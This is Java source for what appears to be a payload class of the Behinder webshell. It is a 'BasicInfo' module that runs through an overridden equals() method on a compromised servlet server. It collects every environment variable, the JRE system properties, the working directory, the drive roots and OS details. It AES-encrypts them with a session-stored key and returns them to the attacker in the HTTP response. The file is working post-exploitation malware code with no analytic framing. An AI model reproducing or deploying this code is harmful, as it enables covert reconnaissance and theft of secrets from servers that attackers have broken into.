package net.rebeyond.behinder.payload.java;

import java.io.File;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Properties;
import java.util.Set;
import java.util.Map.Entry;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;

public class BasicInfo {
   public static String whatever;
   private ServletRequest Request;
   private ServletResponse Response;
   private HttpSession Session;

   public boolean equals(Object obj) {
      String result = "";

      try {
         this.fillContext(obj);
         StringBuilder basicInfo = new StringBuilder("<br/><font size=2 color=red>环境变量:</font><br/>");
         Map env = System.getenv();
         Iterator var5 = env.keySet().iterator();

         while(var5.hasNext()) {
            String name = (String)var5.next();
            basicInfo.append(name + "=" + (String)env.get(name) + "<br/>");
         }

         basicInfo.append("<br/><font size=2 color=red>JRE系统属性:</font><br/>");
         Properties props = System.getProperties();
         Set entrySet = props.entrySet();
         Iterator var7 = entrySet.iterator();

         while(var7.hasNext()) {
            Entry entry = (Entry)var7.next();
            basicInfo.append(entry.getKey() + " = " + entry.getValue() + "<br/>");
         }

         String currentPath = (new File("")).getAbsolutePath();
         String driveList = "";
         File[] roots = File.listRoots();
         File[] var10 = roots;
         int var11 = roots.length;

         for(int var12 = 0; var12 < var11; ++var12) {
            File f = var10[var12];
            driveList = driveList + f.getPath() + ";";
         }

         String osInfo = System.getProperty("os.name") + System.getProperty("os.version") + System.getProperty("os.arch");
         Map entity = new HashMap();
         entity.put("basicInfo", basicInfo.toString());
         entity.put("currentPath", currentPath);
         entity.put("driveList", driveList);
         entity.put("osInfo", osInfo);
         entity.put("arch", System.getProperty("os.arch"));
         result = this.buildJson(entity, true);
         String key = this.Session.getAttribute("u").toString();
         ServletOutputStream so = this.Response.getOutputStream();
         so.write(Encrypt(result.getBytes(), key));
         so.flush();
         so.close();
      } catch (Exception var14) {
      }

      return true;
   }

   public static byte[] Encrypt(byte[] bs, String key) throws Exception {
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            Class Base64;
            Object Encoder;
            if (version.compareTo("1.9") >= 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
               Base64 = Class.forName("sun.misc.BASE64Encoder");
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }

         sb.append(value);
         sb.append("\",");
      }

      sb.setLength(sb.length() - 1);
      sb.append("}");
      return sb.toString();
   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = (ServletRequest)obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
         this.Response = (ServletResponse)obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
         this.Session = (HttpSession)obj.getClass().getDeclaredMethod("getSession").invoke(obj);
      } else {
         Map objMap = (Map)obj;
         this.Session = (HttpSession)objMap.get("session");
         this.Response = (ServletResponse)objMap.get("response");
         this.Request = (ServletRequest)objMap.get("request");
      }

      this.Response.setCharacterEncoding("UTF-8");
   }
}
